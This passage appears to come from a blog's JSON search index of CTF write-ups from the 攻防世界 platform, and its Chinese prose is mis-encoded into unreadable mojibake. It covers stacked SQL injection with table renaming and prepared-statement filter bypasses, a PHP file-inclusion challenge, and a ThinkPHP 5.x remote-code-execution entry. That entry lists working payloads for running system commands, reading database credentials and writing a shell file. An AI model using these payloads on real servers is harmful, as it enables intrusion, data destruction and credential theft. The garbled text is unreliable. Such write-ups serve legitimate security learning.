è¿™é‡Œæ¥ç€æµ‹è¯•å‡ æ³¢ï¼Œå‘ç°#å¯ä»¥æˆåŠŸæ³¨é‡Šå†…å®¹ï¼Œæ¥ç€å…ˆåˆ¤æ–­åˆ—æ•°ï¼Œæ ¹æ®æŠ¥é”™æƒ…å†µï¼Œå‘ç°ä¸º2åˆ— æ¥ç€è”åˆæ³¨å…¥ä¸€ä¸‹ 1' union select 1, database() # å‘ç°è¢«æ­£åˆ™è¿‡æ»¤äº†ï¼Œå¹¶ä¸”å¤§å°å†™ï¼ŒåŒå†™ç»•è¿‡ä¹Ÿä¸è¡Œï¼Œupdateä¹Ÿè¿‡æ»¤äº†ï¼Œé‚£æˆ‘ä»¬å°è¯•ä¸€ä¸‹extractæŠ¥é”™æ³¨å…¥ 1' and extractvalue(1,concat(0x7e,database())) # æˆåŠŸæ‰§è¡Œï¼ ç»§ç»­å¹² 1' and extractvalue(1,concat(0x7e,database())) # ä½†åˆæƒ³åˆ°ï¼Œå…³é”®è¯ä¾æ—§æ˜¯è¢«è¿‡æ»¤çš„ï¼Œè¿˜æ˜¯è¡Œä¸é€šï¼Œæ²¡æ€è·¯äº†ï¼Œçœ‹äº†wpå‘ç°ï¼Œå±…ç„¶å¿˜äº†å †å æ³¨å…¥ï¼Œé‚£å°±ç†Ÿæ‚‰ä¸€ä¸‹ 1'; show databases; # 1'; use supersqli;show tables; # 1';use supersqli;show columns from `1919810931114514`;# è¿™é‡Œæ³¨æ„ï¼šçº¯æ•°å­—ä¸ºè¡¨åï¼Œè¦ç”¨åå¼•å·åŒ…è£¹ æ‰¾åˆ°flagï¼Œåˆ°è¿™ä¸€æ­¥å°±å¤´ç–¼äº†ï¼Œæœ¬æ¥è¦selectçš„ï¼Œä¸è¿‡è¢«è¿‡æ»¤äº†ï¼Œæ€è·¯æ²¡äº†ï¼Œç»§ç»­çœ‹wpï¼Œæ–¹æ³•çœŸå¤šå•Š æ–¹æ³•ä¸€ï¼šsqlé¢„ç¼–è¯‘ å‚è€ƒï¼šé¢„ç¼–è¯‘ è®¾ç½®å‚æ•° set @sql = CONCAT('se','lect * from `1919810931114514`;'); æ‰§è¡Œé¢„ç¼–è¯‘SQLè¯­å¥ prepare stmt from @sql; EXECUTE stmt; åˆèµ·æ¥ä¸º 1';set @sql = CONCAT('se','lect * from `1919810931114514`;');prepare stmt from @sql;EXECUTE stmt;# ã€‚ã€‚ã€‚setä¹Ÿè¿‡æ»¤äº†ï¼Œä¸è¿‡å¹¸å¥½å¯ä»¥å¤§å°å†™ç»•è¿‡ 1';Set @sql = CONCAT('se','lect * from `1919810931114514`;');prepare stmt from @sql;EXECUTE stmt;# æ‹¿åˆ°flagï¼Œè¿™é‡Œä¹Ÿæ˜¯å› ä¸ºè¿™é“é¢˜å¼€å¯äº†sqlé¢„ç¼–è¯‘ï¼Œä¸ç„¶è¿™æ–¹æ³•è¡Œä¸é€š æ–¹æ³•äºŒï¼šæ”¹åˆ—å æˆ‘ä»¬æŸ¥è¯¢wordsåˆ—å‘ç°ç»“æ„å¤§è‡´ç›¸åŒï¼Œç”±äºæ³¨å…¥æ¡†çš„æŸ¥è¯¢æ˜¯å¯¹åˆ—idçš„æœç´¢ï¼Œæ­¤æ—¶å‚è€ƒä¸¤ä¸ªè¡¨çš„åˆ—åï¼Œéœ€è¦å°†flagåˆ—åæ”¹ä¸ºèƒ½å¤ŸæŸ¥æ‰¾çš„idåˆ—ï¼ˆä¿®æ”¹åŒ…æ‹¬åç§°å’Œæ•°æ®ç±»å‹ï¼‰ã€‚ 1';use supersqli;show columns from words;# æ¥ä¸‹æ¥è¾“å…¥ï¼š 1';rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);# GPTåˆ†æä¸€æ³¢ä¸Šè¿°sqlè¯­å¥ è¿™ä¸ªSQLè¯­å¥çœ‹èµ·æ¥åƒæ˜¯ä¸€ä¸ªæ¶æ„çš„SQLæ³¨å…¥æ”»å‡»å°è¯•ï¼Œè¯•å›¾é€šè¿‡ä¿®æ”¹æ•°æ®åº“è¡¨çš„åç§°å’Œå­—æ®µæ¥å®ç°æŸç§ç›®çš„ã€‚è®©æˆ‘é€æ­¥è§£æè¿™ä¸ªè¯­å¥ä¸­çš„æ¯ä¸€éƒ¨åˆ†ï¼š 1. `1';rename tables `words` to `words1`;` è¿™ä¸€éƒ¨åˆ†é¦–å…ˆä»¥æ•°å­—1å¼€å§‹ï¼Œç„¶åæ¥ç€ä½¿ç”¨äº†åˆ†å·æ¥ç»ˆæ­¢å‰ä¸€ä¸ªæŸ¥è¯¢è¯­å¥ã€‚æ¥ä¸‹æ¥ï¼Œå®ƒè¯•å›¾é€šè¿‡`rename tables`å‘½ä»¤å°†æ•°æ®åº“è¡¨`words`é‡å‘½åä¸º`words1`ã€‚è¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„SQLæ³¨å…¥æ”»å‡»æ‰‹æ³•ï¼Œæ—¨åœ¨æ‰§è¡Œæ¶æ„çš„æ•°æ®åº“æ“ä½œã€‚ 2. `rename tables `1919810931114514` to `words`;` åœ¨è¿™é‡Œï¼Œæ”»å‡»è€…è¯•å›¾å°†è¡¨å`1919810931114514`é‡å‘½åä¸º`words`ï¼Œç»§ç»­åˆ©ç”¨`rename tables`å‘½ä»¤è¿›è¡Œè¡¨æ“ä½œã€‚ 3. `alter table `words` change `flag` `id` varchar(100);` è¿™ä¸€éƒ¨åˆ†ä½¿ç”¨`alter table`å‘½ä»¤ï¼Œè¯•å›¾ä¿®æ”¹åä¸º`words`çš„è¡¨ï¼Œå°†å…¶å­—æ®µ`flag`æ›´æ”¹ä¸ºåä¸º`id`çš„æ–°å­—æ®µï¼Œç±»å‹ä¸º`varchar(100)`ã€‚è¿™ä¹Ÿæ˜¯ä¸€ä¸ªæ¶æ„æ“ä½œçš„å°è¯•ï¼Œå¯èƒ½ä¼šç ´åæ•°æ®åº“çš„ç»“æ„å’Œæ•°æ®ã€‚ 4. `#` äº•å·ï¼ˆ#ï¼‰è¡¨ç¤ºæ³¨é‡Šï¼Œæ­¤åçš„å†…å®¹å°†è¢«è§†ä¸ºæ³¨é‡Šè€Œä¸è¢«æ‰§è¡Œã€‚ æ€»ä¹‹ï¼Œè¿™ä¸ªSQLè¯­å¥çš„ç›®çš„ä¼¼ä¹æ˜¯é€šè¿‡é‡å‘½åè¡¨å’Œä¿®æ”¹å­—æ®µæ¥å¯¹æ•°æ®åº“è¿›è¡Œæ¶æ„æ“ä½œã€‚è¿™ç§ç±»å‹çš„æ”»å‡»å¯èƒ½ä¼šå¯¼è‡´æ•°æ®æŸåã€æ•°æ®æ³„éœ²ä»¥åŠç³»ç»Ÿå´©æºƒç­‰é—®é¢˜ã€‚åœ¨å¼€å‘å’Œç»´æŠ¤åº”ç”¨ç¨‹åºæ—¶ï¼ŒåŠ¡å¿…é‡‡å–å¿…è¦çš„å®‰å…¨æªæ–½ï¼Œå¦‚ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢ã€è¾“å…¥éªŒè¯å’Œé¿å…åŠ¨æ€æ„å»ºSQLè¯­å¥ï¼Œä»¥é˜²èŒƒSQLæ³¨å…¥ç­‰å®‰å…¨é£é™©ã€‚ é‚£è¿™é‡Œæˆ‘ä»¬ç›´æ¥ä¸‡èƒ½è¯­å¥1â€™ or 1=1#å°±å¯ä»¥äº†ï¼Œæ¯•ç«Ÿflagç°åœ¨åœ¨idå­—æ®µé‡Œï¼Œä½†è¿™é‡Œä¼¼ä¹flagçš„idå­—æ®µé»˜è®¤ä¸º0äº†ï¼Œä»¥è‡³äºæˆ‘ä»¬å¯ä»¥æŸ¥å‡ºæ¥ï¼Œä½†GPTè¯´è¿™é‡Œé»˜è®¤åº”ä¸ºnullã€‚ä¸è¿‡ä½¿ç”¨ä¸‡èƒ½è¯­å¥ï¼Œå³å¯æŸ¥è¯¢åˆ°sqlä¸­æ‰€æœ‰å­—æ®µæ•°å¯¹åº”çš„æ•°æ® æ–¹æ³•ä¸‰ï¼šæ”¹åˆ—å-å¦ç±»æ–¹æ³• ç¬¬äºŒä¸ªæ–¹æ³•æ˜¯å°†ä¸¤ä¸ªè¡¨åˆ—åäº’æ¢ï¼ŒæŸ¥è¯¢è¯­å¥ä¸å˜çš„æƒ…å†µä¸‹ï¼Œä¼šç›´æ¥æŸ¥è¯¢wordsè¡¨ä¸­å†…å®¹ã€‚ RENAME TABLE tbl_name TO new_tbl_name å°†è¡¨tbl_nameçš„åå­—æ”¹æˆnew_tbl_nameã€‚ ç”±äºæ³¨å…¥æ¡†çš„æŸ¥è¯¢æ˜¯å¯¹åˆ—idçš„æœç´¢ï¼Œæ­¤æ—¶å‚è€ƒä¸¤ä¸ªè¡¨çš„åˆ—åï¼Œéœ€è¦å°†flagåˆ—åæ”¹ä¸ºèƒ½å¤ŸæŸ¥æ‰¾çš„idåˆ—ï¼ˆä¿®æ”¹åŒ…æ‹¬åç§°å’Œæ•°æ®ç±»å‹ï¼‰ã€‚ ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL; å…·ä½“ä¸ºä»€ä¹ˆä¿®æ”¹ä¸ºCHARACTER SET utf8 COLLATE utf8_general_ci NOT NULLå°±æ˜¯æ•°æ®åº“æ•°æ®ç±»å‹çš„é—®é¢˜äº†ã€‚ å°†æ“ä½œè¿è´¯èµ·æ¥ï¼Œæ„é€ Payloadã€‚ 1â€™;RENAME TABLE words TO word;RENAME TABLE 1919810931114514 TO words;ALTER TABLE words CHANGE flag id VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;SHOW columns FROM words; 1';RENAME TABLE `words` TO `word`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;SHOW columns FROM words; åˆ°è¿™é‡Œæˆ‘ä»¬çš„è¡¨åˆ—åå°±å·²ç»ä¿®æ”¹å®Œæ¯•ï¼Œæ­¤æ—¶è¿˜ä¼šè¾“å‡ºä¿®æ”¹å®Œæˆçš„wordsåˆ—åï¼Œæœ€åé€šè¿‡ä¸‡èƒ½é’¥åŒ™1â€™ or â€˜1â€™='1å³å¯å¾—åˆ°è¾“å‡ºã€‚ å‚è€ƒæ–‡ç« ï¼š å‚è€ƒä¸€ å‚è€ƒäºŒ","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-Web_php_include","path":"/2023/08/14/web-php-include/","content":"é¢˜ç›®æè¿°ï¼š æ—  é¢˜ç›®è§£é¢˜ï¼š æ ¹æ®é¢˜ç›®ä¿¡æ¯ï¼Œå¾ˆæ˜æ˜¾æ˜¯æ–‡ä»¶åŒ…å«ï¼Œè¿™é‡Œé™„ä¸Šæºç  &lt;?php show_source(__FILE__); echo $_GET['hello']; $page=$_GET['page']; while (strstr($page, \"php://\")) { $page=str_replace(\"php://\", \"\", $page); } include($page); ?&gt; strstr-å‡½æ•°è§£æ è¿™é‡Œä¹Ÿå°±æ˜¯getä¼ å‚ä¹‹åï¼Œåˆ¤æ–­å‚æ•°ä¸­æ˜¯å¦æœ‰æŒ‡å®šå­—ç¬¦ï¼Œæœ‰çš„è¯å°†å…¶æ›¿æ¢ä¸ºç©º è¿™é‡Œçœ‹åˆ°echoçš„åœ°æ–¹ï¼Œä»¥ä¸ºè¿˜è¦å˜é‡è¦†ç›–å•¥çš„æ¥è¾“å‡ºå†…å®¹ï¼Œä¸è¿‡ä¼¼ä¹è¡Œä¸é€šï¼Œé‚£å°±ç”¨å…¶ä»–ä¼ªåè®®å§ dataä¼ªåè®® æ¥ç€æŸ¥çœ‹æºä»£ç å³å¯æ‹¿åˆ°flag è¿™é‡Œä¸åœ¨èµ˜è¿°å‰©ä½™æ–¹æ³•ï¼Œæ„Ÿå…´è¶£å¯ä»¥å‚è€ƒæ–‡ç« è‡ªè¡Œå°è¯• æ–‡ç« å‚è€ƒï¼š å‚è€ƒä¸€ å‚è€ƒäºŒ","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-php_rce","path":"/2023/08/14/php-rce/","content":"é¢˜ç›®æè¿°ï¼š æ—  é¢˜ç›®ä¿¡æ¯ï¼š è¿™é‡Œä¹Ÿæ˜¯ç¬¬ä¸€æ­£å¼åšæœ‰å…³æ¡†æ¶çš„æ¼æ´ï¼Œé‚£å°±é¡ºæ‰‹å­¦ä¹ ä¸€æ³¢ 0x01 ThinkPHP 5æ¼æ´ç®€ä»‹ ThinkPHPå®˜æ–¹2018å¹´12æœˆ9æ—¥å‘å¸ƒé‡è¦çš„å®‰å…¨æ›´æ–°ï¼Œä¿®å¤äº†ä¸€ä¸ªä¸¥é‡çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ›´æ–°ä¸»è¦æ¶‰åŠä¸€ä¸ªå®‰å…¨æ›´æ–°ï¼Œç”±äºæ¡†æ¶å¯¹æ§åˆ¶å™¨åæ²¡æœ‰è¿›è¡Œè¶³å¤Ÿçš„æ£€æµ‹ä¼šå¯¼è‡´åœ¨æ²¡æœ‰å¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹å¯èƒ½çš„getshellæ¼æ´ï¼Œå—å½±å“çš„ç‰ˆæœ¬åŒ…æ‹¬5.0å’Œ5.1ç‰ˆæœ¬ï¼Œæ¨èå°½å¿«æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ã€‚ çœ‹å¾—å‡ºæ¥ç¨‹åºæ²¡ç»è¿‡æ§åˆ¶å™¨è¿›è¡Œè¿‡æ»¤ï¼Œæ‰€ä»¥å¯ä»¥ç”¨/æ¥æ§åˆ¶ç¨‹åºã€‚ æä¸æ‡‚è¿™ä¸ªæ¼æ´æ˜¯æ€ä¹ˆæå‡ºæ¥çš„ï¼Œå€Ÿç”¨ä¸€ä¸‹å¤§ç¥çš„ç­”æ¡ˆã€‚ ?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=æ“ä½œç³»ç»Ÿå‘½ä»¤ (å¦‚ dir whoami) ThinkPHPæ¡†æ¶çš„ä¸»è¦ç‰¹ç‚¹åŒ…æ‹¬ï¼š MVCæ¶æ„ï¼šé‡‡ç”¨ç»å…¸çš„MVCï¼ˆModel-View-Controllerï¼‰æ¶æ„ï¼Œå°†åº”ç”¨ç¨‹åºçš„ä¸šåŠ¡é€»è¾‘ã€æ•°æ®æ¨¡å‹å’Œç”¨æˆ·ç•Œé¢åˆ†ç¦»ï¼Œä½¿å¾—åº”ç”¨ç¨‹åºæ›´æ˜“äºç»´æŠ¤å’Œæ‰©å±•ã€‚ ORMæ”¯æŒï¼šæä¾›äº†å¼ºå¤§çš„ORMï¼ˆObject-Relational Mappingï¼‰æ”¯æŒï¼Œå¯ä»¥å°†æ•°æ®åº“è¡¨æ˜ å°„ä¸ºå¯¹è±¡ï¼Œä½¿å¾—å¼€å‘äººå‘˜å¯ä»¥æ›´æ–¹ä¾¿åœ°æ“ä½œæ•°æ®åº“ã€‚ ç¼“å­˜æ”¯æŒï¼šæä¾›äº†å¤šç§ç¼“å­˜æ”¯æŒï¼ŒåŒ…æ‹¬æ–‡ä»¶ç¼“å­˜ã€Memcachedç¼“å­˜ã€Redisç¼“å­˜ç­‰ï¼Œå¯ä»¥æé«˜åº”ç”¨ç¨‹åºçš„æ€§èƒ½å’Œå“åº”é€Ÿåº¦ã€‚ å®‰å…¨æ€§ï¼šæä¾›äº†å¤šç§å®‰å…¨æœºåˆ¶ï¼ŒåŒ…æ‹¬è¾“å…¥éªŒè¯ã€è¾“å‡ºè¿‡æ»¤ã€SQLæ³¨å…¥é˜²æŠ¤ã€XSSé˜²æŠ¤ç­‰ï¼Œå¯ä»¥ä¿éšœåº”ç”¨ç¨‹åºçš„å®‰å…¨æ€§ã€‚ æ‰©å±•æ€§ï¼šæä¾›äº†ä¸°å¯Œçš„æ‰©å±•æœºåˆ¶ï¼ŒåŒ…æ‹¬æ’ä»¶æœºåˆ¶ã€è¡Œä¸ºæœºåˆ¶ã€æ¨¡æ¿å¼•æ“æ‰©å±•ç­‰ï¼Œå¯ä»¥æ–¹ä¾¿åœ°æ‰©å±•å’Œå®šåˆ¶åº”ç”¨ç¨‹åºã€‚ 0x02 PHP REC PHP RCE æŒ‡çš„æ˜¯é€šè¿‡è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆRemote Code Executionï¼‰æ¥æ”»å‡» PHP ç¨‹åºçš„ä¸€ç§æ–¹å¼ã€‚ç®€å•æ¥è¯´ï¼Œç”±äºPHPåº”ç”¨ç¨‹åºæ²¡æœ‰æ­£ç¡®å¤„ç†å¤–éƒ¨è¾“å…¥æ•°æ®ï¼ˆå¦‚ç”¨æˆ·æäº¤çš„è¡¨å•ã€è¯·æ±‚å‚æ•°ç­‰ï¼‰ï¼Œæ”»å‡»è€…é€šè¿‡æŸäº›æ‰‹æ®µå‘ PHP åº”ç”¨ç¨‹åºä¸­æ³¨å…¥æ¶æ„ä»£ç ï¼Œç„¶åé€šè¿‡è¿™äº›æ¶æ„ä»£ç å®ç°å¯¹å—æ”»å‡»æœåŠ¡å™¨çš„æ§åˆ¶ã€‚ ä¸‹é¢ç®€å•ä»‹ç»ä¸€ç§å¸¸è§çš„è¿œç¨‹ RCE æ¼æ´åˆ©ç”¨æ–¹å¼ï¼Œå³åˆ©ç”¨ PHP ä¸­çš„ eval å‡½æ•°å®ç° RCE çš„æ–¹å¼ã€‚åœ¨è¯¥ç¤ºä¾‹ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ HTTP è¯·æ±‚å‘ç›®æ ‡æœåŠ¡å™¨ä¼ é€’ PHP ä»£ç ï¼Œå¹¶æ‰§è¡Œè¯¥ä»£ç ï¼š // æœåŠ¡ç«¯ä»£ç  $user_input = $_GET['user_input']; // æ²¡æœ‰å¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤ eval('$result = ' . $user_input . ';'); // è¿œç¨‹ä»£ç æ‰§è¡Œ // æ”»å‡»è€…æ„é€ æ¶æ„ä»£ç  http://example.com/index.php?user_input=system('ls%20-la'); //è¿œç¨‹æ‰§è¡Œ \"ls -la\" å‘½ä»¤ã€‚ ç”±äºæœåŠ¡å™¨ä»£ç æ²¡æœ‰å¯¹ user_input çš„å†…å®¹è¿›è¡Œè¿‡æ»¤å’ŒéªŒè¯ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ user_input å‚æ•°å‘é€ä»»æ„ PHP ä»£ç ï¼Œå¹¶å°†å…¶ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ä¼ é€’ç»™ eval å‡½æ•°è¿›è¡Œæ‰§è¡Œï¼ŒæˆåŠŸå®ç°ls -laå‘½ä»¤ã€‚ åœ¨ Unix/Linux ç³»ç»Ÿä¸­ï¼Œls -la å‘½ä»¤å¯ä»¥åˆ—å‡ºå½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œå­ç›®å½•ï¼Œå¹¶æ˜¾ç¤ºå®ƒä»¬çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬æƒé™ã€åˆ›å»ºæ—¶é—´ã€å¤§å°ç­‰ç­‰ã€‚ 0x03 ThinkPHP V5æ¼æ´Payload 3.1 thinkphp 5.0.22 1ã€http://192.168.1.1/thinkphp/public/?s=.|think\\config/get&amp;name=database.username 2ã€http://192.168.1.1/thinkphp/public/?s=.|think\\config/get&amp;name=database.password 3ã€http://url/to/thinkphp_5.0.22/? s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id 4ã€http://url/to/thinkphp_5.0.22/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1 3.2 thinkphp 5 1ã€http://127.0.0.1/tp5/public/?s=index/\\think\\View/display&amp;content=%22%3C?%3E%3C?php%20phpinfo();?%3E&amp;data=1 3.3 thinkphp 5.0.21 1ã€http://localhost/thinkphp_5.0.21/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id 2ã€http://localhost/thinkphp_5.0.21/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1 3.4 thinkphp 5.1. 1ã€http://url/to/thinkphp5.1.29/?s=index/\\think\\Request/input&amp;filter=phpinfo&amp;data=1 2ã€http://url/to/thinkphp5.1.29/?s=index/\\think\\Request/input&amp;filter=system&amp;data=cmd 3ã€http://url/to/thinkphp5.1.29/?s=index/\\think\\template\\driver\\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3E 4ã€http://url/to/thinkphp5.1.29/?s=index/\\think\\view\\driver\\Php/display&amp;content=%3C?php%20phpinfo();?%3E 5ã€http://url/to/thinkphp5.1.29/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1 6ã€http://url/to/thinkphp5.1.29/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cmd 7ã€http://url/to/thinkphp5.1.29/?s=index/\\think\\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1 8ã€http://url/to/thinkphp5.1.29/?s=index/\\think\\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cmd 3.5 thinkphp5.0.20 1ã€http://localhost/thinkphp_5.0.21/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id é¢˜ç›®è§£é¢˜ï¼š åœ¨è¿™é‡Œå‘¢ï¼Œä¸å…ˆå•°å—¦æ¼æ´çš„å¤ç°ï¼Œå¤ç°å°±æ”¾åœ¨æ¼æ´åº“å§ï¼Œæœ‰æ—¶é—´å…ˆæè¿™ä¸ªï¼Œæˆ‘ä»¬å›å½’é¢˜ç›® æ–¹æ³•ä¸€ï¼šæ‰‹å·¥ ä½¿ç”¨thinkphp 5.1.payloadï¼Œæµ‹è¯•ä¸€æ‰‹æ¡†æ¶ç‰ˆæœ¬ URL + /?s=index/\\think\\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls å›æ˜¾å¦‚ä¸‹ï¼š çœŸå®åŸç†ç›®å‰æ²¡äº†è§£ï¼Œä¸è¿‡èƒ½çœ‹å‡ºæ¥ï¼Œè¿™é‡Œçš„pocæ€è·¯æ˜¯è°ƒç”¨ä¸€ä¸ªæ–¹æ³•ï¼Œä¼ å…¥call_user_func_arrayå‡½æ•°ï¼Œæ¥ç€ä¼ å…¥systemï¼Œåˆ™ä¼šæˆåŠŸæ‰§è¡Œsystem(â€˜lsâ€™)ï¼›å‘½ä»¤ å‘ç°æŠ¥é”™ï¼Œæ˜¾ç¤ºç‰ˆæœ¬ä¸º5.0.20ï¼Œé‚£æˆ‘ä»¬å¯¹åº”ä½¿ç”¨pocå³å¯ ?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id æˆåŠŸæ‰§è¡Œï¼Œæ›´æ¢å‘½ä»¤ ?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls åœ¨æŸ¥çœ‹ä¸€ä¸‹æ ¹ç›®å½• ?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls / ?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag æ‹¿åˆ°flag æ–¹æ³•äºŒï¼šå·¥å…·æ£€æµ‹ å¯¹äºthinkphpæ¡†æ¶Githubä¸Šæœ‰ä¸€ä¸ªä¸“ç”¨çš„æ¼æ´éªŒè¯å·¥å…·ï¼šhttps://github.com/zangcc/Aazhen-v3.1 ä¸‹è½½é¡¹ç›®ä¸­çš„jaråŒ…ä¹‹åï¼Œåœ¨Aazhen_RexHaæ–‡ä»¶æ ¹ç›®å½•ä¸‹è¿è¡Œå‘½ä»¤æ‰“å¼€è¯¥å·¥å…· java -javaagent:rexha.jar -jar rexha.jar æ‰“å¼€å·¥å…·åå°†é¶åœºåœ°å€ç²˜è¿›å»ï¼Œå…¨æ‰«ä¸€éåå‘ç°æœ‰ä¸¤ä¸ªæ¼æ´ï¼Œä¸€ä¸ªæ˜¯è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œè¿˜æœ‰ä¸€ä¸ªæ•°æ®åº“ä¿¡æ¯æ³„éœ² è¿œç¨‹ä»£ç ä»»æ„æ‰§è¡Œä¸€èˆ¬èƒ½æ‹¿åˆ°ä¸å°‘ä¸œè¥¿ï¼Œå…ˆä½¿ç”¨è¿™ä¸ªï¼Œæ­¤å·¥å…·å·²ç»ç»™ä¸€ä¸ªå¯ç”¨çš„urlæ¡ˆä¾‹ï¼Œæˆ‘ä»¬åªéœ€è¦æ›´æ”¹å°±å¯ä»¥äº† http://61.147.171.105:49836/index.php?s=%2FIndex%2F%5Cthink%5Capp%2Finvokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=system&amp;vars%5B1%5D%5B%5D=id //è¿™ä¸ªurlå·²ç»è¿‡urlencodeï¼Œä¸ºäº†æ–¹ä¾¿ç†è§£ï¼Œä¸‹é¢ä¸€è¡Œä½¿ç”¨urldecodeç»“æœå±•ç¤º http://61.147.171.105:49836/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id å‚æ•°è§£æ è¿™ä¸ªURLå‚æ•°æ˜¯å¯¹ç›®æ ‡webæœåŠ¡å™¨è¿›è¡Œçš„è¿œç¨‹ä»£ç æ‰§è¡Œ ThinkPHPçš„è¯·æ±‚å¤„ç†å™¨ï¼ˆthinkï¼‰ åº”ç”¨ç¨‹åºæ§åˆ¶å™¨ï¼ˆappï¼‰ å‡½æ•°è°ƒç”¨å™¨ï¼ˆinvokefunctionï¼‰ é€šè¿‡invokefunctionæŒ‡å®šäº†è¦è°ƒç”¨çš„å‡½æ•°åä¸º\"calluserfuncarray\"ã€‚è¯¥å‡½æ•°çš„ä½œç”¨æ˜¯è°ƒç”¨ä¸€ä¸ªç”¨æˆ·è‡ªå®šä¹‰çš„å‡½æ•°ï¼Œå¹¶å°†ä¸€ä¸ªæ•°ç»„ä½œä¸ºå‚æ•°ä¼ é€’ç»™è¯¥å‡½æ•°ã€‚ åœ¨è¿™ä¸ªURLè¯·æ±‚ä¸­ï¼Œè¯¥å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯\"system\"ï¼Œè¡¨ç¤ºè¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤ï¼Œ ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå…¶ä¸­åŒ…å«è¦ä¼ é€’ç»™è¯¥å‘½ä»¤çš„å‚æ•°ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œè¯¥æ•°ç»„åªåŒ…å«ä¸€ä¸ªå‚æ•°\"id\" ä¸‹é¢æˆ‘ä»¬æŠŠçš„ç¬¬äºŒä¸ªæ•°ç»„å…ƒç´ å†…å®¹ä½œä¸ºè¦æ‰§è¡Œçš„å‘½ä»¤ä¿®æ”¹ä»¥ä¸‹å°±okäº† è¿™é‡Œå‚è€ƒæ–¹æ³•ä¸€å³å¯ï¼Œä¸åœ¨èµ˜è¿° å‚è€ƒæ–‡ç« ï¼š æ–¹æ³•ä¸€å‚è€ƒ æ–¹æ³•äºŒå‚è€ƒ","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"eduæŒ–æ˜","path":"/2023/08/09/ji-yi-ci-edusrc-lou-dong-wa-jue/","content":"å‰è¨€ è¿™é‡Œä¹Ÿæ˜¯èŠ±äº†å°†è¿‘ä¸€å‘¨çš„æ—¶é—´åŠ ä¸Šè¿æ°”æˆåˆ†æ‰æ‰¾åˆ°çš„ï¼Œæ€ä¹ˆè¯´å‘¢ï¼Œè¿™æ¬¡æˆåŠŸçš„æŒ–æ˜è®©æˆ‘å¯¹å‰æœŸçš„ä¿¡æ¯æœé›†æœ‰äº†åˆ‡èº«çš„ä½“ä¼šï¼ŒçœŸçš„åº”äº†é‚£å°±è¯ï¼šä¿¡æ¯æœé›†æœçš„è¶Šå¤šï¼ŒæŒ–å‡ºæ¥çš„ä¹Ÿè¶Šå¤šã€‚ åœ¨è¿™æ®µæ—¶é—´å‰æœŸå¾ˆå¿§æ„ï¼Œæ„Ÿè§‰è‡ªå·±çœŸåºŸï¼Œä»€ä¹ˆä¹Ÿæä¸å‡ºæ¥ï¼Œä½†ä¹Ÿç¡®å®ä½“ä¼šåˆ°äº†å®æˆ˜çš„ç¯å¢ƒï¼ŒåŒæ—¶åº†å¹¸è‡ªå·±åšæŒäº†ä¸‹æ¥ï¼Œè™½ç„¶æ¼æ´ä¸æ€ä¹ˆé«˜çº§ï¼Œä½†ä¹Ÿç®—æ˜¯è‰¯å¥½çš„å¼€ç«¯ã€‚ 